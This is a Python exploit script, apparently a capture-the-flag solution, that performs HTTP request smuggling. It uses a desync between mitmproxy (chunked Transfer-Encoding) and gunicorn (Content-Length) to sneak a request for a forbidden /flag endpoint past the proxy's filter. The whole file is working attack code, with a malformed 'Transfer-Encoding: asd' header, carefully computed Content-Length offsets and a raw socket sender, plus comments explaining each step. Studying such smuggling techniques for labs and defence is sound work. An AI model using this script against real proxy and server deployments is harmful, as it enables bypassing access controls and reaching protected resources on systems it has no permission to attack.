#!/usr/bin/env python3
import socket
from request_builder import Request_Builder
import time

HOST = '0.0.0.0'
PORT = 8002

# https://blog.deteact.com/gunicorn-http-request-smuggling/
# mitmproxy and gunicorn have different checks for encoding chunked header
# mitmproxy will use the chunked encoding header (TE), thus mitmproxy will see flag_request and hello_request as one request
# this allows the wrapped flag request to bypass the /flag filter, since flag_request is no real request for mitmproxy but just part of the body
# gunicon will use the content length header (CL), thus gunicorn will see flag_request and hello_request as two requests and handle them separately, resulting in two responses back to mitmproxy
# to retrieve the second response we send an extra request

flag_request_builder = Request_Builder()
flag_request_builder.url = "/flag"
flag_request_builder.host = "{}:{}".format(HOST, PORT)
flag_request = flag_request_builder.build()

hello_request_builder = Request_Builder()
hello_request_builder.url = "/hello"
hello_request_builder.host = "{}:{}".format(HOST, PORT)
hello_request_builder.add_content_length_header = True
# we have to fix the content-length, so we adjust the offset
# mitmproxy ignores the content-length, but gunicorn will use it
# mitmproxy should only take some chunked encoding syntax and should end right before the smuggled request begins
# thus we have to remove the length of the flag request from the offset
# but we still have to add some offset back, because we have to account for the chunked encoding syntax
# the syntax we have to account for is: <length of body, in this case flag request, in hex> + linebreak
hello_request_builder.content_length_offset = - len(flag_request) + len(hex(len(flag_request)).replace("0x", "") + "\r\n")
hello_request_builder.add_chunked_encoding_header = True
hello_request_builder.add_chunked_encoding_header_value = "asd"
hello_request_builder.add_chunked_encoding_body = True
hello_request_builder.body = flag_request
hello_request = hello_request_builder.build()

extra_request_builder = Request_Builder()
extra_request_builder.url = "/hello"
extra_request_builder.host = "{}:{}".format(HOST, PORT)
extra_request = extra_request_builder.build()

msg = hello_request + extra_request
print("SEND:")
print(msg)
print("RAW:")
print(msg.encode("ascii"))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(msg.encode("ascii"))
    response = s.recv(1024).decode("ascii")
    print("RECEIVED:")
    print(response)
    time.sleep(1)
    response = s.recv(1024).decode("ascii")
    print("RECEIVED:")
    print(response)
